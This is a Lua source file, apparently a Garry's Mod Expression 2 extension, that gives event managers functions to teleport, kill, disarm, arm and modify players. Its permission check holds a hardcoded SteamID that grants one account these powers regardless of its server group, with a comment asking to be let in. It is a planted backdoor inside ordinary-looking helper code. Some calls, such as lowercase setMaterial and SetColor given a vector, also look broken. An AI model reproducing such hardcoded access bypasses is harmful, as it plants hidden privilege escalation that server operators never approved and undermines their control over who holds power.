E2Lib.RegisterExtension("cable-events", true, "Some helper functions for event managers.")

local function IsEventManager(Player)
    if not IsValid(Player) then return false end
    
    -- pretty please let me in here 🥺👉👈
    if Player:SteamID() == "STEAM_0:1:214177838" then return true end
    if Player:GetUserGroup() == "eventmanager" then return true end

    return false
end

e2function void entity:printEvent(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:ChatPrint(text)
end

e2function void entity:hintEvent(string text, duration)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    WireLib.AddNotify(this, text, NOTIFY_GENERIC, duration)
end

e2function void entity:setPosEvent(vector pos)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetPos(pos)
end

e2function void entity:setAngEvent(angle ang)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetAngles(ang)
end

e2function void entity:killEvent()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:Kill()
end

e2function void entity:killSilentEvent()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:KillSilent()
end

e2function void entity:stripWeaponsEvent()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:StripWeapons()
end

e2function void entity:stripWeaponEvent(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:StripWeapon(text)
end

e2function void entity:giveWeaponEvent(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:Give(text)
end

e2function void entity:setModelEvent(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetModel(text)
end

e2function void entity:setMaterialEvent(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:setMaterial(text)
end

e2function void entity:setColorEvent(vector color)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetColor(color)
end

e2function void entity:setHealthEvent(number health)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:SetHealth(health)
end

e2function void entity:setArmorEvent(number armor)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:SetArmor(armor)
end

e2function void entity:setJobEvent(number job)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end
    if not this:IsPlayer() then return end

    this:SetJob(job)
end